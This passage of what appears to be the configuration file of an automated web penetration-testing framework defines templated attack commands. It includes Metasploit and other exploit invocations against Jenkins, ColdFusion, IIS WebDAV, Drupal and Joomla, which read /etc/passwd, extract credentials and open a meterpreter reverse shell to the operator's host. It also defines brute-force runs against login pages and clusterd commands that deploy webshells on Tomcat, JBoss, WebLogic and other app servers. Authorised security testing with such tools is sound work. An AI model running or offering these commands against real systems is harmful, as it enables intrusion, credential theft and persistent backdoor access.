context_1   = { 'web-appserver': 'Oracle/Glassfish' }

[check_jenkins-unauthenticated-console]
name        = jenkins-unauthenticated-console
category    = exploit
description = Detect and exploit unauthenticated Jenkins-CI script console
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jenkins_command; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set COMMAND 'echo Unauthenticated Jenkins console vulnerability OK && whoami'; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Jenkins' }

[check_jenkins-cli-deserialize-cve2015-8103]
name        = jenkins-cli-deserialize-cve2015-8103
category    = exploit
description = Exploit Java deserialization (unauthenticated) in Jenkins CLI RMI (CVE-2015-8103) 
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jenkins -u [URL] --cmd whoami --disable-check-updates
context_1   = { 'web-appserver': 'Jenkins' }

[check_coldfusion-xxe-cve2009-3960]
name        = coldfusion-xxe-cve2009-3960
category    = exploit
description = Exploit XXE in Coldfusion 7/8/9 (CVE-2009-3960)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/adobe_xml_inject; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE /etc/passwd; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'linux' }
command_2   = sudo msfconsole -q -x "use auxiliary/scanner/http/adobe_xml_inject; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE \\Windows\\win.ini; set VERBOSE true; run; exit"
context_2   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'windows' }

[check_coldfusion-path-traversal-cve2010-2861]
name        = coldfusion-path-traversal-cve2010-2861
category    = exploit
description = Exploit path traversal in Coldfusion (CVE-2010-2861)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use scanner/http/coldfusion_locale_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE /etc/passwd; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'linux' }
command_2   = sudo msfconsole -q -x "use scanner/http/coldfusion_locale_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE \\Windows\\win.ini; set VERBOSE true; run; exit"
context_2   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'windows' }

[check_coldfusion-path-traversal-cve2013-3336]
name        = coldfusion-path-traversal-cve2013-3336
category    = exploit
description = Exploit path traversal in Coldfusion 9/10 and extract creds (CVE-2013-3336)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/gather/coldfusion_pwd_props; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Adobe/Coldfusion' }

[check_iis-webdav-win2003-bof]
name        = iis-webdav-win2003-bof
category    = exploit
description = Exploit Buffer overflow in WebDAV in IIS 6.0 on Windows 2003 R2 (CVE-2017-7269)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [LOCALIP]; set LPORT 8443; set VERBOSE true; set AutoRunScript multi_console_command -c getuid,ps,exit; exploit; exit"
context_1   = { 'web-server': 'Microsoft/IIS', 'webdav': True, 'os': 'windows' }

[check_drupal-rce-drupalgeddon2]
name        = drupal-rce-drupalgeddon2
category    = exploit
description = Exploit Drupalgeddon2 RCE in CMS Drupal 7.x < 7.58 & 8.x < 8.1 (CVE-2018-7600)
tool        = drupwn
command_1   = /bin/bash -c 'echo -e "exploit CVE-2018-7600\nquit" | python3 drupwn --mode exploit --target [URL]'
context_1   = { 'web-cms': 'Drupal|>=7' }

[check_drupal-rce-rest-cve2019-6340]
name        = drupal-rce-rest-cve2019-6340
category    = exploit
description = Exploit REST RCE in CMS Drupal 8.5.x < 8.5.11 & 8.6.x < 8.6.10 (CVE-2019-6340)
tool        = drupwn
command_1   = /bin/bash -c 'echo -e "exploit CVE-2019-6340\nquit" | python3 drupwn --mode exploit --target [URL]'
context_1   = { 'web-cms': 'Drupal|>=8' } 

[check_joomla-comfields-sqli-rce]
name        = joomla-comfields-sqli-rce
category    = exploit
description = Exploit SQL injection to RCE in com_fields component in Joomla >= 3.7.0 (CVE-2017-8917)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set PAYLOAD php/exec; set CMD 'echo Joomla comfields SQLi to RCE vulnerability OK && whoami'; set TARGETURI [URL]; set VERBOSE true; run; exit"
context_1   = { 'web-cms': 'Joomla' }

#########################################################################################
# Bruteforce
#########################################################################################
[check_bruteforce-htaccess]
name        = bruteforce-htaccess
category    = bruteforce
description = Bruteforce HTTP authentication (htaccess) if 401 Unauthorized returned
tool        = web-brutator
command_1   = python3 web-brutator.py --url [URL] --target jenkins -U "[WORDLISTSDIR]/usernames/usernames-short.txt" -P "[WORDLISTSDIR]/passwords/pass-medium.txt" --threads 40 --stoponsuccess
context_1   = { 'htaccess': True, 'auth_type': 'htaccess', 'auth_status': NO_AUTH }

[check_bruteforce-wordpress]
name        = bruteforce-wordpress
category    = bruteforce
description = Bruteforce Wordpress accounts (require detected username(s))
tool        = wpseku
command_1   = python3 wpseku.py --url [URL] --brute --user '[USERNAME]' --wordlist "[PASSLIST default="passwords/pass-medium.txt"]"
context_1   = { 'web-cms': 'Wordpress', 'auth_type': 'wordpress', 'auth_status': USER_ONLY }

#########################################################################################
# Postexploit
#########################################################################################
[check_appserver-postauth-deploy]
name        = appserver-postauth-deploy
category    = postexploit
description = Deploy a webshell on appserver (require credentials)
tool        = clusterd
command_1   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a axis2 --deploy "[WEBSHELLSDIR]/AxisInvoker.aar" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_1   = { 'web-appserver': 'Apache/Axis2|version_known', 'auth_type': 'axis2', 'auth_status': POST_AUTH }
command_2   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a axis2 --deploy "[WEBSHELLSDIR]/AxisInvoker.aar" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_2   = { 'web-appserver': 'Apache/Axis2|version_unknown', 'auth_type': 'axis2', 'auth_status': POST_AUTH }

command_3   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a coldfusion --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_3   = { 'web-appserver': 'Adobe/Coldfusion|version_known', 'auth_type': 'coldfusion', 'auth_status': POST_AUTH }
command_4   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a coldfusion --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_4   = { 'web-appserver': 'Adobe/Coldfusion|version_unknown', 'auth_type': 'coldfusion', 'auth_status': POST_AUTH }

command_5   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a jboss --deploy "[WEBSHELLSDIR]/cmd.jsp" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_5   = { 'web-appserver': 'Jboss|version_known', 'auth_type': 'jboss', 'auth_status': POST_AUTH }
command_6   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a jboss --deploy "[WEBSHELLSDIR]/cmd.jsp" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_6   = { 'web-appserver': 'Jboss|version_unknown', 'auth_type': 'jboss', 'auth_status': POST_AUTH }

command_7   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a railo --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_7   = { 'web-appserver': 'Railo|version_known', 'auth_type': 'railo', 'auth_status': POST_AUTH }
command_8   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a railo --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_8   = { 'web-appserver': 'Railo|version_unknown', 'auth_type': 'railo', 'auth_status': POST_AUTH }

command_9   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a tomcat --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_9   = { 'web-appserver': 'Apache/Tomcat|version_known', 'auth_type': 'tomcat', 'auth_status': POST_AUTH }
command_10  = python2.7 ./clusterd.py -i [IP] -p [PORT] -a tomcat --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_10  = { 'web-appserver': 'Apache/Tomcat|version_unknown', 'auth_type': 'tomcat', 'auth_status': POST_AUTH }

command_11  = python2.7 ./clusterd.py -i [IP] -p [PORT] -a weblogic --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_11  = { 'web-appserver': 'Oracle/Weblogic Server|version_known', 'auth_type': 'weblogic', 'auth_status': POST_AUTH }
command_12  = python2.7 ./clusterd.py -i [IP] -p [PORT] -a weblogic --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_12  = { 'web-appserver': 'Oracle/Weblogic Server|version_unknown', 'auth_type': 'weblogic', 'auth_status': POST_AUTH }

# [check_wordpress-shell-upload]
# name        = wordpress-shell-upload
# category    = vuln
# description = Upload shell on Wordpress (require admin credentials)
# tool        = wpforce
# command_1   = python2.7 yertle.py -u "[USERNAME]" -p "[PASSWORD]" -t [URL] -i
# context_1   = { 'web-cms': 'Wordpress', 'auth_type': 'wordpress', 'auth_status': POST_AUTH }

# [check_pwncat-shell-upload]
# name        = pwncat-shell-upload
# category    = vuln
# description = Upload shell on Webserver (require admin credentials)
# tool        = pwncat
# command_1   = pwncat -u [URL] -p [PORT] -f [WEBSHELLSDIR]/cmd.php -c [USERNAME]:[PASSWORD]